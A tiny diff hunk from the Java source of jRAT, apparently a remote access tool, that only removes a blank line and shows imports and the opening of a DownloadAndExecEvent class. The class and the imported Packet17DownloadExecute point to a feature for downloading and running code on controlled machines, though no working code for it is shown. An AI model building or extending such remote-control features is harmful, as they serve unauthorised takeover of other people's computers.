@@ -8,7 +8,6 @@ import pro.jrat.packets.outgoing.Packet17DownloadExecute;
 import pro.jrat.utils.IconUtils;
 import pro.jrat.utils.Utils;
 
-
 public class DownloadAndExecEvent extends Event {
 
 	public ImageIcon icon = IconUtils.getIcon(getIcon());
